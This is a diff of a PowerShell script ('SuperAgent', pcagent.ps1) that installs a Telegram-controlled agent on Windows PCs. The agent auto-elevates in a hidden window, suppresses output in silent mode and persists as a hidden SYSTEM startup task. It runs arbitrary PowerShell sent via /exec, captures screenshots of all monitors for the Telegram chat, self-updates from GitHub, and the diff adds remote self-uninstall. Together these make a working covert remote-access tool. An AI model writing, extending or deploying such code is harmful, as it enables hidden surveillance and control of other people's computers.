@@ -50,14 +50,12 @@ try {
 # =====================================================================
 if ($Silent) {
     $ErrorActionPreference = 'SilentlyContinue'
-    # Redirect all output streams to $null
     $null = New-Item -Path 'Alias:' -Name 'Write-Host' -Value 'Out-Null' -Force -ErrorAction SilentlyContinue
 } else {
     $ErrorActionPreference = 'Stop'
 }
 
 function Write-Msg {
-    # Wrapper that respects -Silent
     param([string]$Message, [string]$Color = 'White')
     if (-not $Silent) {
         Write-Host $Message -ForegroundColor $Color
@@ -66,7 +64,6 @@ function Write-Msg {
 
 # =====================================================================
 # AUTO-ELEVATE: if -Install/-Uninstall and not admin, relaunch as admin
-# In -Silent mode, the elevated process runs with -WindowStyle Hidden
 # =====================================================================
 function Test-IsAdmin {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -75,8 +72,6 @@ function Test-IsAdmin {
 }
 
 function Invoke-SelfElevation {
-    # Rebuild the original command line and relaunch via Start-Process -Verb RunAs
-    # Preserves all original parameters (-Install, -BotToken, -ChatId, -PCName, -Silent, ...)
     $argString = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
     foreach ($key in $PSBoundParameters.Keys) {
         $val = $PSBoundParameters[$key]
@@ -94,7 +89,6 @@ function Invoke-SelfElevation {
     Write-Msg ''
 
     try {
-        # -WindowStyle Hidden on the elevated process: no flashing window
         $p = Start-Process -FilePath 'powershell.exe' `
                             -ArgumentList $argString `
                             -Verb RunAs `
@@ -113,14 +107,9 @@ function Invoke-SelfElevation {
     }
 }
 
-# Auto-elevate for Install/Uninstall modes
 if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
     Invoke-SelfElevation
-    # (function above never returns - it exits)
 }
-
-# Note: $InstallBlock / $UninstallBlock / $AgentBlock are defined below.
-# Dispatch happens at the very end of the script (after block definitions).
 
 # =====================================================================
 # INSTALL BLOCK
@@ -128,9 +117,6 @@ if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
  $InstallBlock = {
     $ErrorActionPreference = 'Stop'
 
-    # (Admin check done by auto-elevate above)
-
-    # --- Interactive prompts for missing params (skipped in -Silent mode) ---
     if (-not $BotToken -and -not $Silent) {
         $BotToken = Read-Host 'Bot Token (e.g. 123456789:ABCdef...)'
     }
@@ -141,7 +127,6 @@ if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
         $PCName = Read-Host "PC Name (e.g. PC-Office, Laptop-NV)"
     }
 
-    # --- Validate ---
     if ($PCName -notmatch '^[A-Za-z][A-Za-z0-9_\-]{1,31}$') {
         throw "Invalid PCName: '$PCName'. Allowed: letters, digits, underscore, dash (2-32 chars, must start with a letter)."
     }
@@ -149,7 +134,7 @@ if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
         throw 'Bot Token is required.'
     }
     if ($BotToken -notmatch '^\d+:[A-Za-z0-9_\-]{30,}$') {
-        Write-Msg "! Bot Token format looks invalid (e.g. 123456789:ABCdef...). Continuing but may not work." -Color Yellow
+        Write-Msg "! Bot Token format looks invalid. Continuing but may not work." -Color Yellow
     }
     if ($RepoUrl -match 'USERNAME/REPO') {
         throw @'
@@ -173,12 +158,50 @@ You must:
     Write-Msg "  Silent   : $Silent"
     Write-Msg ''
 
-    # --- Create folder ---
     if (-not (Test-Path $InstallDir)) {
         New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
     }
 
-    # --- Save script locally (copy current file, or download from $RepoUrl) ---
+    # --- Detect existing installation and clean up before reinstall ---
+    $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+    $existingConfig = Test-Path $ConfigPath
+    if ($existingTask -or $existingConfig) {
+        Write-Msg '[*] Existing installation detected. Cleaning up before reinstall...' -Color Yellow
+
+        if ($existingTask) {
+            try {
+                Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+                Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+                Write-Msg '[+] Old scheduled task removed.' -Color Green
+            } catch { }
+        }
+
+        # Kill any running agent processes
+        Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+            Where-Object { $_.CommandLine -like '*pcagent.ps1* -Run*' } |
+            ForEach-Object {
+                try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch { }
+            }
+        Start-Sleep -Seconds 1
+
+        # Preserve old config if user did not provide new values
+        if ($existingConfig -and -not $BotToken) {
+            try {
+                $oldCfg = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
+                if (-not $BotToken -and $oldCfg.BotToken) { $BotToken = $oldCfg.BotToken }
+                if (-not $ChatId -and $oldCfg.ChatId)     { $ChatId = [string]$oldCfg.ChatId }
+                if (-not $PCName -and $oldCfg.PCName)     { $PCName = $oldCfg.PCName }
+                Write-Msg '[+] Reused config values from previous installation.' -Color Green
+            } catch { }
+        }
+
+        # Wipe old files
+        Get-ChildItem -Path $InstallDir -Force -ErrorAction SilentlyContinue |
+            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Msg '[+] Old files wiped.' -Color Green
+    }
+
+    # --- Save script locally ---
     if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
         Copy-Item $PSCommandPath $ScriptPath -Force
         Write-Msg '[+] Script copied from local.' -Color Green
@@ -199,23 +222,21 @@ You must:
         ChatId      = $ChatId
         PCName      = $PCName
         RepoUrl     = $RepoUrl.TrimEnd('/')
-        Version     = '2.1.0'
+        Version     = '2.2.0'
         InstalledAt = (Get-Date -Format 'o')
     }
     $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
     Write-Msg '[+] config.json saved' -Color Green
 
-    # --- Remove existing scheduled task ---
+    # --- Remove any leftover scheduled task ---
     if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
-        Write-Msg '[*] Updating existing scheduled task...'
         try {
             Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
             Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
         } catch { }
     }
 
-    # --- Create scheduled task: SYSTEM, AtStartup, auto-restart ---
-    # Hidden window: -WindowStyle Hidden. No console flash on boot.
+    # --- Create scheduled task ---
     Write-Msg '[*] Creating scheduled task (SYSTEM, AtStartup, auto-restart, hidden)...'
     $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                  -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptPath`" -Run"
@@ -238,7 +259,7 @@ You must:
     Start-ScheduledTask -TaskName $TaskName
     Write-Msg '[+] Scheduled task created and started.' -Color Green
 
-    # --- Wait & verify agent started + sent Telegram message (only if not silent) ---
+    # --- Wait & verify ---
     $verified = $false
     if (-not $Silent) {
         Write-Msg ''
@@ -261,7 +282,6 @@ You must:
             }
         }
     } else {
-        # Silent mode: still wait a moment to ensure task started, but no console output
         Start-Sleep -Seconds 3
     }
 
@@ -309,7 +329,6 @@ You must:
         Write-Msg '[.] No scheduled task to remove.' -Color Yellow
     }
 
-    # Kill any running agent processes
     Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
         Where-Object { $_.CommandLine -like '*pcagent.ps1* -Run*' } |
         ForEach-Object {
@@ -329,7 +348,6 @@ You must:
 # AGENT BLOCK (run mode)
 # =====================================================================
  $AgentBlock = {
-    # --- Load config ---
     if (-not (Test-Path $ConfigPath)) { exit 1 }
     try {
         $Config = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
@@ -345,19 +363,16 @@ You must:
         exit 1
     }
 
-    # --- Load last offset ---
     $script:Offset = 0
     if (Test-Path $OffsetPath) {
         try { $script:Offset = [int](Get-Content $OffsetPath -First 1) } catch { $script:Offset = 0 }
     }
 
-    # --- Logging function ---
     function Write-Log {
         param([string]$Message)
         try {
             $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
             $line | Out-File $LogPath -Append -Encoding UTF8
-            # Rotate log if > 2MB
             if ((Get-Item $LogPath -ErrorAction SilentlyContinue).Length -gt 2MB) {
                 $bak = "$LogPath.1"
                 if (Test-Path $bak) { Remove-Item $bak -Force }
@@ -368,7 +383,6 @@ You must:
 
     Write-Log "=== Agent started (PCName=$PCName, ChatId=$ChatId, RepoUrl=$RepoUrl) ==="
 
-    # --- Helper functions ---
     function Send-Telegram {
         param([string]$Text)
         if ([string]::IsNullOrWhiteSpace($Text)) { return }
@@ -507,7 +521,6 @@ You must:
         }
         if (-not $username) { return $false }
 
-        # Build argument string: -File <script> <arg1> <arg2> ...
         $argStr = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
         foreach ($a in $ArgumentList) {
             $escaped = $a -replace "'", "''"
@@ -535,9 +548,9 @@ You must:
         $outFile  = Join-Path $InstallDir "shot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
         $tmpScript = Join-Path $InstallDir '_shot.ps1'
 
-        # Build screenshot script content (DPI-aware, full screen)
-        # Use double-quoted here-string outer, single-quoted inner for C# code
-        # Escape $ as `$ so it's literal in output
+        # DPI-aware screenshot, full virtual screen (multi-monitor supported)
+        # Uses SM_XVIRTUALSCREEN(76) / SM_YVIRTUALSCREEN(77) / SM_CXVIRTUALSCREEN(78) / SM_CYVIRTUALSCREEN(79)
+        # to capture ALL monitors, not just primary
         $scriptContent = @"
 param([string]`$OutPath)
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
@@ -553,11 +566,13 @@ public static class ScreenCap {
     [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
     public static void Capture(string path) {
         SetProcessDPIAware();
-        int w = GetSystemMetrics(0);
-        int h = GetSystemMetrics(1);
+        int x = GetSystemMetrics(76);
+        int y = GetSystemMetrics(77);
+        int w = GetSystemMetrics(78);
+        int h = GetSystemMetrics(79);
         Bitmap bmp = new Bitmap(w, h);
         Graphics g = Graphics.FromImage(bmp);
-        g.CopyFromScreen(0, 0, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
+        g.CopyFromScreen(x, y, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
         bmp.Save(path, ImageFormat.Png);
         g.Dispose();
         bmp.Dispose();
@@ -569,21 +584,31 @@ Add-Type `$csCode
 "@
         $scriptContent | Out-File $tmpScript -Encoding UTF8
 
-        # Run via user session (pass outFile as argument)
+        # Run in a fresh child process to isolate DPI awareness
+        # (calling SetProcessDPIAware in parent powershell.exe affects cursor rendering)
+        Write-Log "Screenshot: launching isolated process for $outFile"
         $ok = Invoke-InUserSessionWithArgs -TempScriptPath $tmpScript -ArgumentList $outFile
         if (-not $ok) {
             try {
-                # Fallback: run directly in SYSTEM session (may capture only wallpaper)
-                & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript $outFile 2>&1 | Out-Null
-                $ok = $true
-            } catch { return $null }
+                # Fallback: run via cmd.exe wrapper (truly isolated process)
+                $cmdLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tmpScript`" `"$outFile`""
+                $proc = Start-Process -FilePath 'cmd.exe' -ArgumentList "/c", $cmdLine -WindowStyle Hidden -PassThru -Wait
+                $ok = ($proc.ExitCode -eq 0)
+            } catch {
+                Write-Log "Screenshot fallback FAILED: $($_.Exception.Message)"
+                return $null
+            }
         } else {
             for ($i = 0; $i -lt 20; $i++) {
                 if (Test-Path $outFile) { break }
                 Start-Sleep -Milliseconds 300
             }
         }
-        if (Test-Path $outFile) { return $outFile }
+        if (Test-Path $outFile) {
+            Write-Log "Screenshot OK: $outFile"
+            return $outFile
+        }
+        Write-Log "Screenshot: file not created after wait"
         return $null
     }
 
@@ -633,6 +658,29 @@ Add-Type -AssemblyName System.Windows.Forms
             Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)"
             if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
         }
+    }
+
+    function Invoke-SelfUninstall {
+        # Remote uninstall: agent removes itself, scheduled task, and all files
+        Write-Log "Self-uninstall triggered - spawning cleanup process"
+
+        $uninstallCmd = @"
+Start-Sleep -Seconds 3
+try {
+    Stop-ScheduledTask -TaskName '$TaskName' -ErrorAction SilentlyContinue
+    Unregister-ScheduledTask -TaskName '$TaskName' -Confirm:`$false -ErrorAction SilentlyContinue
+} catch {}
+Start-Sleep -Seconds 1
+Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+    Where-Object { `$_.CommandLine -like '*pcagent.ps1* -Run*' } |
+    ForEach-Object { try { Stop-Process -Id `$_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
+Start-Sleep -Seconds 1
+if (Test-Path '$InstallDir') {
+    Remove-Item -Recurse -Force '$InstallDir' -ErrorAction SilentlyContinue
+}
+"@
+
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$uninstallCmd`"" -WindowStyle Hidden | Out-Null
     }
 
     # --- Boot notification ---
@@ -733,7 +781,6 @@ Add-Type -AssemblyName System.Windows.Forms
                             }
                         }
                         '/msg' {
-                            # /msg REQUIRES @pc - single PC only
                             if (-not $pcname) {
                                 Send-Telegram "[$PCName] Usage: /msg @pc <text>`n(e.g. /msg @PC-Office Hello)`nUse /msgall <text> to broadcast to ALL PCs."
                             } elseif (-not $restText) {
@@ -745,9 +792,7 @@ Add-Type -AssemblyName System.Windows.Forms
                             }
                         }
                         '/msgall' {
-                            # /msgall <text> - broadcast to ALL PCs, no @pc needed
                             $allArgs = $parts[1..($parts.Length - 1)]
-                            # Strip leading @pc if user typed it by mistake
                             if ($allArgs -and $allArgs[0].StartsWith('@')) {
                                 $allArgs = $allArgs[1..($allArgs.Length - 1)]
                             }
@@ -771,6 +816,11 @@ Add-Type -AssemblyName System.Windows.Forms
                         '/update' {
                             Invoke-Update
                         }
+                        '/uninstall' {
+                            Send-Telegram "[$PCName] Uninstalling in 3s... Scheduled task, script, config, and logs will be removed. Agent will stop after this message."
+                            Invoke-SelfUninstall
+                            exit 0
+                        }
                         '/log' {
                             if (Test-Path $LogPath) {
                                 $lines = Get-Content $LogPath -Tail 50
@@ -793,11 +843,13 @@ Add-Type -AssemblyName System.Windows.Forms
 /msgall <text>      - Show popup on ALL PCs
 /exec  @pc <cmd>    - Run PowerShell command (requires @)
 /update  [pc]       - Self-update from GitHub
+/uninstall [pc]     - REMOVE agent from PC (deletes everything)
 /log     [pc]       - Show last 50 log lines
 /help               - Show this help
 
 [pc] = PC name (e.g. PC-Office), omit = ALL PCs.
 /msg and /exec REQUIRE @pc. /msgall does not need @pc.
+/uninstall removes agent completely - cannot be undone remotely.
 "@
                             Send-Telegram $help
                         }
@@ -814,7 +866,7 @@ Add-Type -AssemblyName System.Windows.Forms
 }
 
 # =====================================================================
-# DISPATCH (must be AFTER all block definitions above)
+# DISPATCH
 # =====================================================================
 function Pause-Exit {
     param([string]$Msg = 'Press Enter to exit...')
@@ -863,14 +915,12 @@ if ($Run) {
     try {
         & $AgentBlock
     } catch {
-        # Agent loop should never exit cleanly; if we get here, log and restart
         Start-Sleep -Seconds 10
         exit 1
     }
     exit 0
 }
 
-# Default: show help (only if not silent)
 if (-not $Silent) {
     Write-Msg ''
     Write-Msg '=== SuperAgent - Usage ===' -Color Cyan
